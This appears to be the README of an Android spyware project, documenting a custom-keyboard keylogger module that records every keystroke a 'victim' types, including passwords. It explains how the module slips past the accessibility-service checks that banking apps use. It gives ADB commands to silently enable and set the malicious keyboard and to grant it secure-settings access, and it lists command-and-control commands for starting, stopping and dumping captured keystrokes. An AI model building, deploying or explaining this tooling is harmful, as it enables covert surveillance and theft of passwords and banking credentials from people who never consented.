# Umbra IME Keyboard Keylogger

A custom keyboard (`InputMethodService`) keylogger that captures every keystroke
the victim types in **any** app — without triggering the accessibility-service
detection used by banking apps.

## Why

Banking apps query `AccessibilityManager.getEnabledAccessibilityServiceList()`
and refuse to run (or show "access blocked by your security") when an
accessibility service is enabled. Custom input methods (IMEs) are **not** subject
to that check, and banking apps are far less aggressive about detecting them.
This is the same technique commercial spyware has used for over a decade.

When this keyboard is the active input method, every key passes through our
service, so we capture keystrokes **including password fields** (we generate and
commit each key ourselves, so we always know what was typed).

The existing accessibility keylogger (`UmbraAccessibilityService`) is kept as a
fallback for when the victim does not use the keyboard.

## Activation (one-time, on the victim's device)

The victim must enable and select the keyboard once:

1. `Settings → System → Languages & input → On-screen keyboard` → enable the
   keyboard.
2. Select it as the current keyboard (or via the input-method picker).

This is a normal "add a keyboard" action — far less suspicious than toggling an
accessibility service.

## ADB enable / set commands

If you have ADB access (or shell/root on the device), you can do it silently:

```bash
# Enable the IME
adb shell ime enable org.umbra.core/.modules.UmbraKeyboardService

# Set it as the default/active input method
adb shell ime set org.umbra.core/.modules.UmbraKeyboardService

# Verify (look for mId=org.umbra.core/.modules.UmbraKeyboardService)
adb shell ime list -a
```

> Programmatic enable/set from inside the agent is attempted via
> `Settings.Secure` (`ENABLED_INPUT_METHODS` / `DEFAULT_INPUT_METHOD`), but that
> requires `WRITE_SECURE_SETTINGS` (granted via `adb shell pm grant
> org.umbra.core android.permission.WRITE_SECURE_SETTINGS` or root). Without it,
> the agent falls back to opening the input-method settings screen / picker.

## C2 commands

| Command | Action | Description |
|---|---|---|
| `keylog` | `start` | Start the accessibility keylogger (existing). |
| `keylog` | `start_keyboard` | Start the IME keylogger — enables streaming, verifies/attempts to enable the IME, opens the picker/settings if needed. |
| `keylog` | `enable_keyboard` | Open the IME picker / input-method settings so the victim can enable + select the keyboard. |
| `keylog` | `status` | Reports `ime_enabled`, `ime_default`, plus accessibility/streaming state. |
| `keylog` | `stop` | Stop streaming + persist buffer. |
| `keylog` | `dump` | Dump buffered keystrokes. |

## Capture channels

1. **Soft-keyboard key press** — authoritative plaintext (works for passwords).
2. **Hardware keyboard** — `onKeyDown` physical key events.
3. **Field text snapshot** — `getTextBeforeCursor()` / `getTextAfterCursor()` on
   every selection update; buffered for dump context (masked for password
   fields).

## Files

- `app/src/main/java/org/umbra/core/modules/UmbraKeyboardService.kt` — the IME.
- `app/src/main/res/xml/method.xml` — IME declaration.
- `app/src/main/AndroidManifest.xml` — service registration.
- `app/src/main/java/org/umbra/core/modules/KeylogModule.kt` — command surface +
  IME state helpers.
- `app/src/main/java/org/umbra/core/core/SynapseEngine.kt` — command routing.
